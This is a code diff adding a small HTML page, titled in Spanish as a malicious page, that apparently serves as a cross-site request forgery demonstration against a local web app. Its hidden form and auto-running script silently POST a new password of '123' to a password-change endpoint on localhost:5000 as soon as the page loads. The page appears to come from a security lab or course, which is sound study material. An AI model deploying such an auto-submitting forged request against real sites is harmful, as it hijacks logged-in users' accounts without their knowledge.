@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página Maliciosa</title>
+</head>
+<body>
+    <h1>Página Maliciosa</h1>
+
+
+    <form action="http://localhost:5000/cambiar_contrasenia" method="POST" id="formulario-maldito">
+        <input type="hidden" name="nueva_contrasenia" value="123" >
+    </form>
+
+    <script>
+        document.getElementById('formulario-maldito').submit()
+    </script>
+
+
+</body>
+</html>
